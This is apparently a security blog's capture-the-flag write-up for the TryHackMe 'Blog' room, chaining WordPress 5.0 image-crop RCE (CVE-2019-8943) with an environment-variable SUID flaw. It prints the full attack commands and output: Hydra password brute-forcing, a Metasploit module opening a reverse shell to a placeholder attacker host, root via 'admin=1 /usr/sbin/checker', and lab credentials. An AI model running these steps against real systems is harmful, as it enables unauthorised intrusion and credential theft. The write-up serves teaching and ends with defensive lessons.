@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Blog &middot; Low Priv Notes
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/ctf/web/2026/07/10/blog/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>Notes, CTF writeups and security research. Focusing on alternative privilege escalation vectors.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+    <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Low Priv Notes</a>
+<br>            
+<small>Exploring alternative exploitation paths</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">Blog</h1>
+  <span class="post-date">10 Jul 2026</span>
+  <h2 id="overview">Overview</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Platform</strong></td>
+      <td>TryHackMe</td>
+    </tr>
+    <tr>
+      <td><strong>Difficulty</strong></td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td><strong>URL</strong></td>
+      <td><a href="https://tryhackme.com/room/blog" target="_blank">https://tryhackme.com/room/blog</a></td>
+    </tr>
+    <tr>
+      <td><strong>Focus</strong></td>
+      <td>WordPress 5.0 RCE chained with SUID environment variable exploitation for root access</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>This room demonstrates a complete attack chain combining a known WordPress vulnerability with a subtle privilege escalation flaw. The challenge involves exploiting weak image handling in WordPress 5.0 and then finding a SUID binary that makes dangerous assumptions about environment variable security.</p>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>I started by scanning the target to identify running services and their versions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-O</span> <span class="nt">-p</span> 22,80,139,445 &lt;TARGET_IP&gt;
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp   open  http        Apache httpd 2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu
+</code></pre></div></div>
+
+<p>The system is running Linux 4.15 with WordPress 5.0 on port 80. Both SSH and Samba services are present, which could be useful, but the web application is where the vulnerability lies.</p>
+
+<hr />
+
+<h2 id="getting-in--wordpress-enumeration">Getting In — WordPress Enumeration</h2>
+
+<p>I used <code class="language-plaintext highlighter-rouge">wpscan</code> to identify users and plugins in the WordPress installation.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://blog.thm <span class="nt">--enumerate</span> u
+
+<span class="o">[</span>+] WordPress Version: 5.0 <span class="o">(</span>Insecure, from 6 December 2018<span class="o">)</span>
+<span class="o">[</span>+] Theme: Twenty Twenty 1.3
+<span class="o">[</span>+] XML-RPC: Enabled
+<span class="o">[</span>+] Upload directory listing: Enabled
+
+Users:
+- kwheel <span class="o">(</span>Karen Wheeler<span class="o">)</span>
+- bjoel <span class="o">(</span>Billy Joel<span class="o">)</span>
+</code></pre></div></div>
+
+<p>WordPress 5.0 was released in December 2018 and contains CVE-2019-8943 — a Remote Code Execution vulnerability in the image crop functionality. I found two user accounts but needed credentials to exploit WordPress. XML-RPC being enabled meant I could attempt brute-force attacks.</p>
+
+<p>I also checked SMB to see what else was available:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> blog.thm
+
+<span class="o">[</span>+] Disk: BillySMB                    Permissions: READ, WRITE
+    Comment: Billy<span class="s1">'s local SMB Share
+</span></code></pre></div></div>
+
+<p>The SMB share was accessible anonymously. I downloaded several files (an image, a video, a PNG) but the steganographic image only contained a red herring — a text file saying “You’ve found yourself in a rabbit hole, friend.” This was a deliberate distraction.</p>
+
+<hr />
+
+<h2 id="brute-forcing-wordpress-credentials">Brute-forcing WordPress Credentials</h2>
+
+<p>With XML-RPC enabled and a user account identified, I ran Hydra to crack the password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> kwheel <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt &lt;TARGET_IP&gt; http-post-form <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&amp;testcookie=1:F=The password you entered"</span>
+
+<span class="o">[</span>+] Host: &lt;TARGET_IP&gt;
+<span class="o">[</span>+] User: kwheel
+<span class="o">[</span>+] Password: cutiepie1
+</code></pre></div></div>
+
+<p>The password was weak and found in rockyou.txt. I gained access to the WordPress dashboard, but the <code class="language-plaintext highlighter-rouge">kwheel</code> user lacked administrative privileges — I couldn’t modify theme files or install plugins directly. However, I had valid credentials, which was enough to exploit CVE-2019-8943.</p>
+
+<hr />
+
+<h2 id="wordpress-rce--cve-2019-8943">WordPress RCE — CVE-2019-8943</h2>
+
+<p>WordPress 5.0 contains a vulnerability in how it handles image cropping. Authenticated users can manipulate the crop operation to include arbitrary PHP code in theme files. I used Metasploit to automate this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+search wp crop
+use exploit/multi/http/wp_crop_rce
+
+<span class="nb">set </span>USERNAME kwheel
+<span class="nb">set </span>PASSWORD cutiepie1
+<span class="nb">set </span>RHOSTS &lt;TARGET_IP&gt;
+<span class="nb">set </span>LHOST &lt;ATTACKER_IP&gt;
+<span class="nb">set </span>LPORT &lt;ATTACKER_PORT&gt;
+
+run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on &lt;ATTACKER_IP&gt;:&lt;ATTACKER_PORT&gt;
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress...
+<span class="o">[</span>+] Authenticated with WordPress
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
+<span class="o">[</span>+] Image uploaded
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Including into theme...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>&lt;ATTACKER_IP&gt;:&lt;ATTACKER_PORT&gt; -&gt; &lt;TARGET_IP&gt;:39254<span class="o">)</span>
+</code></pre></div></div>
+
+<p>I obtained a reverse shell running as <code class="language-plaintext highlighter-rouge">www-data</code>. I immediately stabilized it using Python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+</code></pre></div></div>
+
+<p>At this point I had code execution as the web server user. Now I needed to escalate to root.</p>
+
+<hr />
+
+<h2 id="finding-the-privilege-escalation-vector">Finding the Privilege Escalation Vector</h2>
+
+<p>I enumerated the system for SUID binaries and other escalation opportunities:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s2">"snap"</span>
+
+/usr/sbin/checker
+/usr/bin/passwd
+<span class="o">[</span>... other standard binaries ...]
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">/usr/sbin/checker</code> binary stood out — it’s not a standard Linux utility. I analyzed it using <code class="language-plaintext highlighter-rouge">strings</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings /usr/sbin/checker | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"(getenv|admin|system)"</span>
+
+getenv
+admin
+system
+/bin/bash
+Not an Admin
+</code></pre></div></div>
+
+<p>The binary checks for an environment variable named <code class="language-plaintext highlighter-rouge">admin</code> and spawns a bash shell. This looked like a direct privilege escalation if I could satisfy the check.</p>
+
+<hr />
+
+<h2 id="suid-binary-exploitation">SUID Binary Exploitation</h2>
+
+<p>I used <code class="language-plaintext highlighter-rouge">ltrace</code> to see exactly what the binary does at runtime:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ltrace /usr/sbin/checker
+
+getenv<span class="o">(</span><span class="s2">"admin"</span><span class="o">)</span>                    <span class="o">=</span> NULL
+puts<span class="o">(</span><span class="s2">"Not an Admin"</span><span class="o">)</span>               <span class="o">=</span> 13
+Not an Admin
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>The binary exits if <code class="language-plaintext highlighter-rouge">admin</code> is not set. Let me set it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">admin</span><span class="o">=</span>1
+ltrace /usr/sbin/checker
+
+getenv<span class="o">(</span><span class="s2">"admin"</span><span class="o">)</span>                    <span class="o">=</span> <span class="s2">"1"</span>
+setuid<span class="o">(</span>0<span class="o">)</span>                          <span class="o">=</span> <span class="nt">-1</span>
+system<span class="o">(</span><span class="s2">"/bin/bash"</span>
+</code></pre></div></div>
+
+<p>Interesting — <code class="language-plaintext highlighter-rouge">setuid(0)</code> returned -1 (failure), but the shell was spawned anyway. This is because the binary has the SUID bit set, so it already runs with root privileges. The kernel grants these privileges at execution time. When <code class="language-plaintext highlighter-rouge">system("/bin/bash")</code> is called, it inherits the root privileges that the SUID bit granted.</p>
+
+<p>The vulnerability is that the binary uses an environment variable — something <strong>completely under the user’s control</strong> — as its authentication mechanism. The developers assumed only administrators would set this variable, but that’s not how operating systems work.</p>
+
+<p>Let me exploit it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">admin</span><span class="o">=</span>1 /usr/sbin/checker
+
+<span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>✅ UID 0. I’m root.</p>
+
+<hr />
+
+<h2 id="post-exploitation">Post-Exploitation</h2>
+
+<p>Once I had root access, I explored the system and found database credentials in the WordPress configuration:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /var/www/wordpress/wp-config.php | <span class="nb">grep</span> <span class="nt">-A2</span> <span class="s2">"DB_"</span>
+
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'wordpressuser'</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'LittleYellowLamp90!@'</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>These credentials are stored in plaintext in a world-readable configuration file — another security failure. While I already had root access, finding plaintext credentials in application configs is a common real-world finding.</p>
+
+<hr />
+
+<h2 id="attack-flow">Attack Flow</h2>
+
+<div class="mermaid">
+graph TD
+    A["Port scan<br />nmap"] --&gt; B["WordPress 5.0<br />identified"]
+    B --&gt; C["User enumeration<br />wpscan"]
+    C --&gt; D["kwheel user<br />found"]
+    D --&gt; E["Brute-force attack<br />Hydra rockyou.txt"]
+    E --&gt; F["Weak password<br />cutiepie1 cracked"]
+    F --&gt; G["WordPress access<br />authenticated but non-admin"]
+    G --&gt; H["CVE-2019-8943<br />Metasploit wp_crop_rce"]
+    H --&gt; I["Reverse shell<br />www-data obtained"]
+    I --&gt; J["SUID binary found<br />checker identified"]
+    J --&gt; K["ltrace analysis<br />environment variable check"]
+    K --&gt; L["Environment variable<br />admin=1 set"]
+    L --&gt; M["Root shell achieved<br />uid=0"]
+</div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<p><strong>Environment variables are not security boundaries.</strong> SUID binaries should never rely on environment variables for authentication or authorization. The kernel provides privilege elevation; application-level checks using user-controlled input (like environment variables) create a false sense of security.</p>
+
+<p><strong>Weak password dictionaries bite you.</strong> The password <code class="language-plaintext highlighter-rouge">cutiepie1</code> was in rockyou.txt. In real-world scenarios, enforcing password policies and using multi-factor authentication prevents this attack vector entirely.</p>
+
+<p><strong>Known vulnerabilities in legacy software are critical.</strong> WordPress 5.0 was released over 7 years ago (in real time). Running outdated software with documented RCE vulnerabilities is a significant risk. Regular patching and security monitoring are essential.</p>
+
+<p><strong>Plaintext credentials in configuration files.</strong> Storing database passwords in world-readable configuration files is a common mistake. Secrets should be stored in environment variables or secure vaults, never in code or configs checked into version control.</p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/ctf/2026/07/08/watcher/">
+            Watcher
+            <small>08 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/websec/2026/07/07/username-enumeration-timing/">
+            Username Enumeration via Response Timing
+            <small>07 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/ctf/2026/07/06/stuxctf/">
+            StuxCTF
+            <small>06 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script src='/public/js/script.js'></script>
+  </body>
+</html>
